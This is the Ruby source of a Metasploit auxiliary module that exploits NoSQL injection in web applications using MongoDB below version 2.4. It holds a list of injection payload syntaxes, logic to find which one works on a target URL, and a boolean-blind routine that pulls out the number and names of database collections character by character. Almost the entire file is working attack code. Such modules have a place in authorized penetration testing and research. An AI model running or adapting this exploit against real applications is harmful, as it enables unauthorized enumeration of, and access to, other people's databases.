##
## This module requires Metasploit: http//metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MongoDB NoSQL Collection Enumeration Via Injection",
      'Description'    => %q{
      This module can exploit NoSQL injections on MongoDB versions less than 2.4
      and enumerate the collections available in the data via boolean injections.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        ['Brandon Perry <bperry.volatile@gmail.com>'],
      'References'     =>
        [['URL', 'http://nosql.mypopescu.com/post/14453905385/attacking-nosql-and-node-js-server-side-javascript']],
      'Platform'       => ['linux', 'win'],
      'Privileged'     => false,
      'DisclosureDate' => "Jun 7 2014"))

      register_options(
      [
        OptString.new('TARGETURI', [ true, 'Full vulnerable URI with [NoSQLi] where the injection point is', '/index.php?age=50[NoSQLi]'])
      ], self.class)
  end

  def syntaxes
    [['";return+true;var+foo="', '";return+[inject];var+foo="'],
     ["';return+true;var+foo='", "';return+[inject];var+foo='"],
     ["'||this||'", "'||[inject]||'"],
     ['"||this||"','"||[inject]||"'],
     ["||this","||[inject]"]]
  end

  def run
    uri = datastore['TARGETURI']

    res = send_request_cgi({
      'uri' => uri.sub('[NoSQLi]', '')
    })

    pay = ""
    fals = res.body
    tru = nil

    syntaxes.each do |payload|
      print_status("Testing " + payload[0])
      res = send_request_cgi({
        'uri' => uri.sub('[NoSQLi]', payload[0])
      })

      if res.body != fals and res.code == 200
        print_status("Looks like " + payload[0] + " works")
        tru = res.body
        pay = payload[1]
        break
      end
    end

    length = 0
    vprint_status("Getting length of the number of collections.")
    (0..100).each do |len|
      str = "db.getCollectionNames().length==#{len}"
      res = send_request_cgi({
        'uri' => uri.sub('[NoSQLi]', pay.sub('[inject]', str))
      })

      if res.body == tru
        length = len
        print_status("#{len} collections are available")
        break
      end
    end

    vprint_status("Getting collection names")

    (0..length-1).each do |i|
      vprint_status("Getting length of name for collection " + i.to_s)

      name_len = 0
      (0..100).each do |k|
        str = "db.getCollectionNames()[#{i}].length==#{k}"
        res = send_request_cgi({
          'uri' => uri.sub('[NoSQLi]', pay.sub('[inject]', str))
        })

        if res.body == tru
          name_len = k
          print_status("Length of collection #{i}'s name is #{k}")
          break
        end
      end

      vprint_status("Getting collection #{i}'s name")

      name = ''
      (0..name_len).each do |k|
        [*('a'..'z'),*('0'..'9')].each do |c|
          str = "db.getCollectionNames()[#{i}][#{k}]=='#{c}'"
          res = send_request_cgi({
            'uri' => uri.sub('[NoSQLi]', pay.sub('[inject]', str))
          })

          if res.body == tru
            name << c
            break
          end
        end
      end

      print_status ("Collections #{i}'s name is " + name)
    end

  end
end
